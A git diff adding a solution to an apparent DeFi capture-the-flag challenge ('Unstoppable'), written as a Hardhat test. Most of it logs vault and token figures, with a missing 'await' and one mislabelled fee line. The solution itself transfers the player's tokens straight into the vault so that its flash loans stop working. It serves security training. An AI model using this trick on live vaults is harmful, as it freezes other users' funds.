@@ -1,5 +1,6 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
+const { time } = require('@nomicfoundation/hardhat-network-helpers');
 
 describe('[Challenge] Unstoppable', function () {
     let deployer, player, someUser;
@@ -45,6 +46,37 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        // Dump some information to get an idea of what is going on
+        // This code is not necessary for the solution
+        //=============================================================
+        // Asset Token info
+        let totalSupply = await token.totalSupply();
+        let playerBalance = await token.balanceOf(player.address);
+        let vaultAssets = await vault.totalAssets();
+        console.log("Token Total Supply:   ", totalSupply);
+        console.log("Token Player Balance: ", playerBalance);
+        console.log("Token Vault Balance:  ", vaultAssets);
+
+        // Share token info
+        let vaultSupply = await vault.totalSupply();
+        console.log("Share total supply:   ", vaultSupply);
+
+        let maxLoan = vault.maxFlashLoan(token.address);
+        let feeSmallLoan = await vault.flashFee(token.address, 1000n);
+        console.log("Max Loan:       ", maxLoan);
+        console.log("Small Loan Fee: ", feeSmallLoan);
+
+        // If you try to loan out the max fee, the fee kicks in.
+        let feeBigLoan = await vault.flashFee(token.address, maxLoan);
+        console.log("Small Loan Fee: ", feeBigLoan);
+        //=============================================================
+
+        // Solution
+        //=============================================================
+        let playerBalance2 = await token.balanceOf(player.address);
+        await token.connect(player).transfer(vault.address, playerBalance2);
+        //=============================================================
     });
 
     after(async function () {
